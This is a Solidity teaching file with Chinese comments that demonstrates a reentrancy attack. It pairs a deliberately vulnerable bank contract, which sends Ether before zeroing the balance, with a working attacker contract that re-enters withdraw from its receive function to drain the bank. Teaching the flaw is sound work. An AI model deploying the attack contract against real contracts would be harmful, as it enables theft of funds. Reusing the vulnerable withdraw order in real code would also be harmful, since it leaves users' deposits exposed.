// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// --- 1. 受害者合约 (Vulnerable Bank) ---
contract EtherStore {
    mapping(address => uint256) public balances;

    // 存款功能
    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    // 取款功能 (有漏洞！)
    function withdraw() public {
        uint256 bal = balances[msg.sender];
        require(bal > 0);

        // [漏洞点]：先给钱 (Interaction)
        // 这一步会触发接收方的 fallback/receive 函数
        (bool sent, ) = msg.sender.call{value: bal}("");
        require(sent, "Failed to send Ether");

        // [漏洞点]：后扣款 (Effect)
        // 攻击者会在上一行代码执行时，利用“递归”再次冲进这个函数
        // 此时这行代码还没执行，balances 还没变！
        balances[msg.sender] = 0;
    }

    // 查看银行总余额
    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}

// --- 2. 攻击者合约 (Hacker) ---
contract Attack {
    EtherStore public etherStore;

    constructor(address _etherStoreAddress) {
        etherStore = EtherStore(_etherStoreAddress);
    }

    // 攻击入口
    function attack() external payable {
        require(msg.value >= 1 ether);
        // 1. 先存钱，把自己伪装成正常储户
        etherStore.deposit{value: 1 ether}();
        // 2. 发起提款，触发连环陷阱
        etherStore.withdraw();
    }

    // [关键]：类似中断服务函数 (ISR)
    // 当收到 ETH 时自动触发
    receive() external payable { 
        // 检查银行还有没有钱
        if (address(etherStore).balance >= 1 ether) {
            // [递归调用]：趁余额还没扣，再取一次！
            etherStore.withdraw();
        }
    }

    // 查看赃款
    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}